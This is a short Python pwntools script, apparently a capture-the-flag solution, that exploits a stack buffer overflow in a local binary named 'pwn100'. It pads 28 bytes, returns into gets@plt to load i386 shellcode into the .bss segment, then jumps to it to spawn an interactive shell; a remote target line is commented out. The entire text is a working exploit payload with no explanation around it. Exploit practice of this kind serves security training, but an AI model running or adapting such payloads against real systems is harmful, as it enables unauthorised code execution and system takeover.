from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./pwn100')
else :
	# p = remote('svc.pwnable.xyz', 30016)
	print 'Remote server is disabled'
	exit()

gets_plt = 0x080482F0
bss_seg = 0x0804A020
shellcode = asm(shellcraft.i386.linux.sh())

payload = 'A'*28
payload += p32(gets_plt)
payload += p32(bss_seg)*2
p.sendline(payload)

p.sendline(shellcode)

p.interactive()
